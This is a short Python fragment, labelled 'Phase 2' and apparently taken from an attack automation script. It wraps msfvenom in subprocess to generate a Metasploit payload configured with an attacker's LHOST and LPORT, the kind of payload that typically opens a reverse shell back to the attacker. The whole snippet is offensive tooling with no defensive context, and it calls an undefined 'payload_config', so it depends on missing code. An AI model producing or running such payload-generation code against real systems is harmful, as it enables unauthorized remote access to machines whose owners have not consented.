import subprocess

# Phase 2: Generate payload with msfvenom
def generate_payload(config):
    cmd = [
        "msfvenom",
        "-p", config["payload"],
        f"LHOST={config['lhost']}",
        f"LPORT={config['lport']}",
        "-f", config["format"],
        "-o", config["output"]
    ]
    print("[*] Generating payload...")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] Payload generated:", config["output"])
    else:
        print("[!] Error:\n", result.stderr)

generate_payload(payload_config)
